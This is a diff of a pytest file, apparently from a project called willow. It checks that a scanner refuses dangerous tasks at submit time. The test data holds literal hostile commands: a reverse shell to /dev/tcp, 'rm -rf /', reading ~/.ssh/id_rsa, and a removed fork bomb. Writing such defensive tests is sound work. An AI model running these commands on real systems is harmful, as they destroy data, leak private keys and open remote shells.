@@ -653,10 +653,14 @@ def test_task_submit_writes_mapped_columns_after_confirm(app_id, monkeypatch):
     assert params[0] == result["task_id"]
 
 
+# Patterns the *currently published* kartikeya scanner blocks — this test
+# validates willow's submit-time WIRING, not kartikeya's coverage. (The
+# resource-exhaustion class, incl. fork bombs, is tested in kartikeya's own suite
+# and will also be caught here once that scanner release is on PyPI.)
 @pytest.mark.parametrize("task,category", [
-    (":(){ :|:& };:", "resource_exhaustion"),
     ("rm -rf / ", "destructive"),
     ("cat ~/.ssh/id_rsa", "secret_access"),
+    ("bash -i >& /dev/tcp/10.0.0.1/9 0>&1", "exfiltration"),
 ])
 def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
     # Defense-in-depth: a dangerous task is refused at submit BEFORE any DB work,
